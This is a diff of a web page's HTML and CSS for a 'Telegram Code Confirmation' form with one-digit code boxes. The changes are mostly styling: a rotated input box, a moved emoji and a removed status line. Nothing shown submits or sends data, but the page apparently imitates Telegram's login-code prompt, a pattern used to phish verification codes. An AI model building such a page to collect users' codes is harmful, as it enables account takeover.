@@ -31,26 +31,24 @@
         }
         input[type="text"] {
             width: 30px;
+            height: 30px;
             text-align: center;
             padding: 10px;
-            margin-right: 5px;
+            margin-bottom: 5px;
             border: 1px solid #ccc;
             border-radius: 5px;
             font-family: 'Roboto', sans-serif;
+            transform: rotate(90deg);
         }
     </style>
 </head>
 <body>
     <div class="container">
+        <span style="font-size: 24px;">📩</span>
         <h1>Telegram Code Confirmation</h1>
         <p>Please confirm the code sent to your Telegram.</p>
         <form>
             <div style="display: flex; justify-content: center; align-items: center; margin-bottom: 20px;">
-                <span style="font-size: 24px;">📩</span>
-                <span style="font-size: 24px; margin-left: 5px;">Entering code...</span>
-                <span style="font-size: 24px; margin-left: 5px;">&hellip;</span>
-            </div>
-            <div style="display: flex; justify-content: center;">
                 <input type="text" maxlength="1" style="ime-mode: inactive; -webkit-ime-mode: inactive;">
                 <input type="text" maxlength="1" style="ime-mode: inactive; -webkit-ime-mode: inactive;">
                 <input type="text" maxlength="1" style="ime-mode: inactive; -webkit-ime-mode: inactive;">
